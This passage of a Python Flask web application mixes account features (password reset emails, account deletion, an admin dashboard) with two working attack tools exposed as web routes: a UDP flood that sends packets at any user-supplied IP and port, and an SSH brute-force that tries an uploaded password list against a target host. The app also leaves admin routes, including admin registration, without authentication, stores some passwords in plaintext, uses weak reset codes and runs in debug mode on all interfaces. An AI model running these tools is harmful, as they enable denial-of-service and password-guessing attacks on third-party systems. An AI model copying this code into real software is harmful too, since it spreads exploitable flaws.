    text = f"Here is your password reset code: {code}"
    part1 = MIMEText(text, "plain")
    message.attach(part1)
    try:
        # Establish a secure session with Gmail's SMTP server
        with smtplib.SMTP_SSL('smtp.gmail.com', 465) as server:
            server.login(sender_email, password)
            server.sendmail(sender_email, receiver_email, message.as_string())
            print(f"Sending reset code {code} to {email}")
    except smtplib.SMTPAuthenticationError as e:
        print(f"Authentication error: {e}")
    except Exception as e:
        print(f"An error occurred: {e}")

@app.route('/udp_flood', methods=['GET', 'POST'])
def perform_udp_flood():
    if request.method == 'POST':
        # Debugging: Print the form data
        print(request.form)

        # Retrieve and validate form data
        try:
            attack_time = int(request.form.get('attack_time', 0))
            packet_count = int(request.form.get('packet_count', 0))
            target_port = int(request.form.get('target_port', 0))
            target_ip = request.form.get('target_ip', '')
            
            if not attack_time or not packet_count or not target_port or not target_ip:
                raise ValueError("Missing form data")

        except ValueError:
            return render_template('error.html', message='Invalid input. Please enter valid numbers for attack parameters.')

        # Perform UDP flood attack
        try:
            # Craft and send UDP packets
            for _ in range(packet_count):
                send(IP(dst=target_ip)/UDP(dport=target_port), verbose=0)
                time.sleep(0.1)  # Delay between packets (adjust as needed)

            # Simulate attack duration
            time.sleep(attack_time)
        except Exception as e:
            return render_template('error.html', message='Error occurred during UDP flood attack: {}'.format(str(e)))

        return render_template('success.html')
    else:
        return render_template('udp_flood.html')

@app.route('/udp_flood_form')
def udp_flood_form():
    return render_template('udp_flood.html')

@app.route('/password_reset', methods=['GET', 'POST'])
def password_reset():
    if request.method == 'POST':
        email = request.form.get('email')
        # Validate email format
        if not email or '@' not in email:
            flash('Invalid email address.', 'error')
            return render_template('password_reset.html')
        # Connect to the database
        conn = sqlite3.connect(DATABASE)
        cursor = conn.cursor()
        try:
            # Check if email exists
            cursor.execute("SELECT id FROM users WHERE email = ?", (email,))
            user = cursor.fetchone()
            if user:
                # Generate a random 6-digit code
                reset_code = ''.join(random.choices(string.ascii_uppercase + string.digits, k=6))
                # Store the reset code in the database
                cursor.execute("INSERT INTO password_resets (email, reset_code, expiration) VALUES (?, ?, datetime('now', '+1 hour'))",
                               (email, reset_code))
                conn.commit()

                # Send the reset code via email
                send_reset_code(email, reset_code)
                flash(f"A login code has been sent to {email}. Check your email.", 'success')
            else:
                flash(f"No user found with email {email}.", 'error')

        except Exception as e:
            flash(f"An error occurred: {str(e)}", 'error')
        finally:
            conn.close()

        return render_template('password_reset.html')

    return render_template('password_reset.html')

UPLOAD_FOLDER = 'uploads/'
app.config['UPLOAD_FOLDER'] = UPLOAD_FOLDER

@app.route('/ssh_brute', methods=['GET', 'POST'])
def perform_ssh_brute_force():
    if request.method == 'POST':
        # Check if all required form fields are present
        if 'target_ip' not in request.form or 'target_port' not in request.form or 'username' not in request.form:
            return "Missing required form fields", 400

        # Get form data
        target_ip = request.form.get('target_ip')
        target_port = request.form.get('target_port')
        username = request.form.get('username')

        # Ensure target_port is an integer
        try:
            target_port = int(target_port)
        except ValueError:
            return "Invalid port number", 400

        # Handle file upload
        if 'password_list' not in request.files:
            return "Missing file upload", 400

        file = request.files['password_list']

        if file.filename == '':
            return "No selected file", 400

        if file and file.filename.endswith('.txt'):
            file_path = os.path.join(app.config['UPLOAD_FOLDER'], file.filename)
            
            # Save the file securely
            file.save(file_path)
            
            # Process the file and form data
            try:
                result = brute_force_ssh(target_ip, target_port, username, file_path)
            finally:
                # Clean up the file after processing
                os.remove(file_path)
            
            return result
        else:
            return "Invalid file type. Please upload a .txt file.", 400

    return render_template('SSH.html')

def brute_force_ssh(target_ip, target_port, username, password_file_path):
    # Read passwords from the file
    with open(password_file_path, 'r') as file:
        passwords = file.readlines()

    # Attempt to connect to the SSH server
    for password in passwords:
        password = password.strip()  # Remove any surrounding whitespace
        try:
            # Create SSH client instance
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

            # Try to connect
            ssh.connect(target_ip, port=target_port, username=username, password=password)
            # If connection is successful
            ssh.close()
            return f"Success! Password found: {password}"
        except paramiko.AuthenticationException:
            # Authentication failed, try the next password
            continue
        except Exception as e:
            # Handle other potential errors
            return f"Error: {str(e)}"

        time.sleep(1)
    
    return "Failed to brute force. No valid password found."

if __name__ == '__main__':
    # Ensure the upload folder exists
    if not os.path.exists(app.config['UPLOAD_FOLDER']):
        os.makedirs(app.config['UPLOAD_FOLDER'])

@app.route('/check_password_strength', methods=['GET', 'POST'])
def check_password_strength():
    password = request.json.get('password', '')
    
    # Example strength checking logic
    if len(password) >= 8 and any(c.isupper() for c in password) and any(c.isdigit() for c in password) and any(c in '!@#$%^&*' for c in password):
        strength = 'Strong'
    elif len(password) >= 6:
        strength = 'Medium'
    else:
        strength = 'Weak'
    
    return jsonify({'strength': strength})

@app.route('/terms_of_service')
def terms_of_service():
    return render_template('terms_of_service.html')

@app.route('/delete', methods=['GET', 'POST'])
def delete_account():
    if 'email' not in session:
        flash('You need to login first.', 'error')
        return redirect(url_for('login'))

    if request.method == 'POST':
        confirm_email = request.form['confirm']

        if confirm_email == session.get('email'):
            session['delete_confirmation'] = True
            return redirect(url_for('confirm_deletion'))
        else:
            if 'attempt_count' not in session:
                session['attempt_count'] = 0

            session['attempt_count'] += 1

            if session['attempt_count'] == 1:
                flash('Email confirmation does not match. Please try again.', 'error')
            elif session['attempt_count'] == 2:
                flash('If the issue persists, ensure you are entering the correct email.', 'error')
            elif session['attempt_count'] == 3:
                flash('Contact support if you continue to experience problems.', 'error')
            else:
                session['attempt_count'] = 0
                flash('Multiple failed attempts. Please try again later.', 'error')

            return render_template('delete.html')

    # Reset attempt count on initial page load
    session.pop('attempt_count', None)
    return render_template('delete.html')

@app.route('/confirm_deletion', methods=['GET', 'POST'])
def confirm_deletion():
    if 'delete_confirmation' not in session or not session['delete_confirmation']:
        flash('Unauthorized access.', 'error')
        return redirect(url_for('delete_account'))

    if request.method == 'POST':
        email = session.get('email')
        conn = sqlite3.connect(app.config['DATABASE'])
        cursor = conn.cursor()
        cursor.execute("DELETE FROM users WHERE email = ?", (email,))
        conn.commit()
        conn.close()
        session.clear()
        flash('Your account has been deleted.', 'success')
        return redirect(url_for('login'))

    return render_template('confirm_deletion.html')

@app.route('/admin')
def admin_dashboard_view():
    db = get_db()
    total_users = db.execute('SELECT COUNT(*) FROM users').fetchone()[0]
    recent_activity = db.execute('SELECT * FROM activity ORDER BY timestamp DESC LIMIT 5').fetchall()
    system_alerts = db.execute('SELECT * FROM alerts ORDER BY timestamp DESC LIMIT 5').fetchall()
    return render_template('admin_dashboard.html', total_users=total_users, recent_activity=recent_activity, system_alerts=system_alerts)

@app.route('/admin_add', methods=['POST'])
def admin_add():
    name = request.form['name']
    email = request.form['email']
    password = request.form['password']  # Make sure to hash this password
    phone = request.form['phone']

    db = get_db()
    cur = db.cursor()
    cur.execute("INSERT INTO users (name, email, password, phone) VALUES (?, ?, ?, ?)", (name, email, password, phone))
    db.commit()
    db.close()

    flash('User added successfully!', 'success')
    return redirect(url_for('admin_dashboard'))

@app.route('/admin_edit_post', methods=['POST'])
def admin_edit_post():
    user_id = request.form['id']
    name = request.form['name']
    email = request.form['email']
    phone = request.form['phone']

    db = get_db()
    cur = db.cursor()
    cur.execute("UPDATE users SET name = ?, email = ?, phone = ? WHERE id = ?", (name, email, phone, user_id))
    db.commit()
    db.close()

    flash('User updated successfully!', 'success')
    return redirect(url_for('admin_dashboard'))

@app.route('/admin_login', methods=['GET', 'POST'])
def admin_login():
    if request.method == 'POST':
        email = request.form['email']
        password = request.form['password']

        conn = sqlite3.connect(DATABASE)
        cursor = conn.cursor()
        cursor.execute("SELECT * FROM users WHERE email = ?", [email])
        user = cursor.fetchone()
        conn.close()

        # Debugging: Print user data
        print("User data:", user)

        if user:
            # Debugging: Print password check result
            print("Password check:", check_password_hash(user[2], password))
            if check_password_hash(user[2], password) and user[3] == 1:
                session['user_id'] = user[0]  # Store user_id in session
                session['email'] = email  # Store email in session
                flash('Logged in successfully as admin.', 'success')
                return redirect(url_for('admin_dashboard'))
            else:
                flash('Invalid admin credentials', 'error')
        else:
            flash('No user found with this email', 'error')

    return render_template('admin_login.html')

@app.route('/admin_dashboard', methods=['GET', 'POST'])
def admin_dashboard():
    if 'email' not in session:
        flash('You need to login first.', 'error')
        return redirect(url_for('login'))

    if request.method == 'POST':
        bio = request.form['bio']
        file = request.files.get('profile_picture')
        filename = None
        if file and allowed_file(file.filename):
            filename = secure_filename(file.filename)
            file.save(os.path.join(app.config['UPLOAD_FOLDER'], filename))
        update_user_bio_and_picture(session['email'], bio, filename)
        flash('Profile updated successfully.', 'success')
        return redirect(url_for('admin_dashboard'))

    # Fetch all users
    conn = sqlite3.connect(app.config['DATABASE'])
    cursor = conn.cursor()
    cursor.execute("SELECT * FROM users")
    users = cursor.fetchall()
    conn.close()

    return render_template('admin_dashboard.html', users=users)

@app.route('/admin_edit/<int:user_id>', methods=['GET', 'POST'])
def admin_edit(user_id):
    if 'email' in session and is_admin(session['email']):
        conn = sqlite3.connect(DATABASE)
        cursor = conn.cursor()

        if request.method == 'POST':
            new_name = request.form['name']
            new_email = request.form['email']
            cursor.execute("UPDATE users SET name=?, email=? WHERE id=?", (new_name, new_email, user_id))
            conn.commit()
            conn.close()
            flash('User details updated successfully', 'success')
            return redirect(url_for('admin_dashboard'))

        cursor.execute("SELECT * FROM users WHERE id=?", [user_id])
        user = cursor.fetchone()
        conn.close()

        if user:
            return render_template('admin_edit.html', user=user)
        else:
            return 'User not found.'
    else:
        flash('You do not have admin privileges or are not logged in', 'error')
        return redirect(url_for('admin_login'))

@app.route('/admin_delete/<int:user_id>', methods=['POST'])
def admin_delete(user_id):
    if 'email' in session and is_admin(session['email']):
        conn = sqlite3.connect(DATABASE)
        cursor = conn.cursor()
        cursor.execute("DELETE FROM users WHERE id=?", [user_id])
        conn.commit()
        conn.close()
        flash('User deleted successfully', 'success')
        return redirect(url_for('admin_dashboard'))
    else:
        flash('You do not have admin privileges or are not logged in', 'error')
        return redirect(url_for('admin_login'))

@app.route('/admin/activate_user/<int:user_id>', methods=['POST'])
def admin_activate_user(user_id):
    db = get_db()
    db.execute('UPDATE users SET status = 1 WHERE id = ?', (user_id,))
    db.commit()
    flash('User activated successfully!')
    return redirect(url_for('admin_dashboard'))

@app.route('/admin/deactivate_user/<int:user_id>', methods=['POST'])
def admin_deactivate_user(user_id):
    db = get_db()
    db.execute('UPDATE users SET status = 0 WHERE id = ?', (user_id,))
    db.commit()
    flash('User deactivated successfully!')
    return redirect(url_for('admin_dashboard'))

# Content Management
@app.route('/admin/announcements', methods=['POST'])
def admin_post_announcement():
    announcement = request.form['announcement']
    db = get_db()
    db.execute('INSERT INTO announcements (content) VALUES (?)', (announcement,))
    db.commit()
    flash('Announcement posted successfully!')
    return redirect(url_for('admin_dashboard'))

@app.route('/admin/moderate_content', methods=['POST'])
def admin_moderate_content():
    content_id = request.form['content_id']
    action = request.form['action']  # e.g., 'approve', 'delete'

    db = get_db()
    if action == 'approve':
        db.execute('UPDATE content SET status = "approved" WHERE id = ?', (content_id,))
    elif action == 'delete':
        db.execute('DELETE FROM content WHERE id = ?', (content_id,))
    db.commit()
    flash(f'Content {action}d successfully!')
    return redirect(url_for('admin_dashboard'))

# System Settings
@app.route('/admin/config', methods=['POST'])
def admin_config():
    site_preferences = request.form['sitePreferences']
    db = get_db()
    db.execute('UPDATE settings SET preferences = ?', (site_preferences,))
    db.commit()
    flash('Configuration updated successfully!')
    return redirect(url_for('admin_dashboard'))

# Security Features
@app.route('/admin/2fa', methods=['POST'])
def admin_2fa():
    setup_info = request.form['2FASetup']
    db = get_db()
    db.execute('UPDATE settings SET 2fa_info = ?', (setup_info,))
    db.commit()
    flash('Two-Factor Authentication configured successfully!')
    return redirect(url_for('admin_dashboard'))

@app.route('/admin/audit_logs')
def admin_audit_logs():
    db = get_db()
    logs = db.execute('SELECT * FROM audit_logs ORDER BY timestamp DESC').fetchall()
    return render_template('audit_logs.html', logs=logs)

@app.route('/register_admin', methods=['GET', 'POST'])
def register_admin():
    if request.method == 'POST':
        new_email = request.form['new_email']
        new_password = request.form['new_password']
        name = request.form['new_name']  # Get name from form
        phone = request.form['new_phone']  # Get phone number from form

        conn = sqlite3.connect(DATABASE)
        cursor = conn.cursor()

        # Check if the admin already exists
        cursor.execute("SELECT COUNT(*) FROM users WHERE email = ? AND is_admin = 1", (new_email,))
        if cursor.fetchone()[0] > 0:
            conn.close()
            flash("Admin account already exists.", "error")
            return redirect(url_for('admin_login'))

        hashed_password = generate_password_hash(new_password)
        cursor.execute("INSERT INTO users (email, password, name, phone, is_admin) VALUES (?, ?, ?, ?, ?)",
                       (new_email, hashed_password, name, phone, 1))
        conn.commit()
        conn.close()

        flash("Admin account registered successfully.", "success")
        return redirect(url_for('admin_login'))

    return render_template('admin_register.html')

def is_admin(email):
    conn = sqlite3.connect(DATABASE)
    cursor = conn.cursor()
    cursor.execute("SELECT is_admin FROM users WHERE email=?", [email])
    result = cursor.fetchone()
    conn.close()
    return result and result[0] == 1

if __name__ == '__main__':
    app.run(debug=True, host='0.0.0.0', port=5000)
    socketio.run(app, debug=True)
